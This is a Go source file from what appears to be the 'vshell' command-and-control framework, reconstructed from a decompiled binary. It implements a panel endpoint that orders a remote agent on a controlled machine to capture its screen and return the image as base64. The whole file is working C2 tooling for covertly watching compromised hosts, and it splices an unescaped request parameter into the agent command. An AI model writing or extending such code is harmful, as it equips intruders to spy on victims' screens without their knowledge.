// Package controllers — 截图控制器，1:1 对齐原版二进制。
//
// 前端路由：/screenshot/get。
// 说明：ScreenshotController 的 handler 方法名在 funcnametab 中被剥离（仅
// Json* 包装方法保留），但其注册路由存在于内嵌前端（url:"/screenshot/get"），
// 实际截图流由包级函数 D8MCqi8Dry3（0x18d9ba0，使用 "screen" 字符串）承担。
package controllers

import (
	"strings"
	"time"

	"vshell/c2engine"
)

// ScreenshotController 提供 Agent 截图。
type ScreenshotController struct {
	ApiBaseController
}

// screenshotTimeout 是等待代理回传截图的上限。
// 前端该请求自身超时 120s（SPA：`timeout:120*1e3`），服务端留出余量。
const screenshotTimeout = 60 * time.Second

// Get 获取截图（GET /screenshot/get?id=<clientID>&quality=<big|normal|small>）。
//
// 前端（static/assets/vPNC64JSn.js）把返回值直接拼成
// `data:image/jpeg;base64,<result>` 交给 <img>，因此 result 必须是纯 base64，
// 不能包成 JSON 对象。quality 的取值与屏幕页共用（big/normal/small）。
//
// 反编译（0x18d9ba0 D8MCqi8Dry3）：拉起一次屏幕采集并把图像数据流回响应。
func (c *ScreenshotController) Get() {
	id := int64(c.JsonGetInt("id"))
	quality := c.JsonGetStr("quality")
	if id == 0 {
		c.JsonErr("id error")
		return
	}

	client := c2engine.GetEngine().GetClient(id)
	if client == nil {
		// 黑盒：不存在的客户端 → "connection error"（FUN_01919c00 文案）。
		c.JsonErr("connection error")
		return
	}
	if !client.Status {
		c.JsonErr("client is close")
		return
	}

	// agent 侧截图是 JSON 命令（CmdScreenshot），不是文本 "screenshot quality=N"：
	// 后者会落进 shell 报错，面板永远拿不到图。
	cmd := `{"type":"screenshot"}`
	if quality != "" {
		cmd = `{"type":"screenshot","quality":"` + quality + `"}`
	}
	task, err := engineExecShellAsync(id, cmd)
	if err != nil {
		c.JsonErr(err.Error())
		return
	}
	result, err := waitTaskResult(task.ID, screenshotTimeout)
	if err != nil {
		c.JsonErr(err.Error())
		return
	}

	// agent 回的是裸 base64 图片；带空格/换行说明是错误文本（例如目标机没装
	// 截图工具）。这里把 agent 的真实文案透传出去，避免"失败但不知道为什么"。
	if result == "" {
		c.JsonErr("screenshot failed: empty result")
		return
	}
	if strings.ContainsAny(result, " \r\n") {
		c.JsonErr(result)
		return
	}
	c.Ctx.Output.Header("Content-Type", "text/plain; charset=utf-8")
	_ = c.Ctx.Output.Body([]byte(result))
}
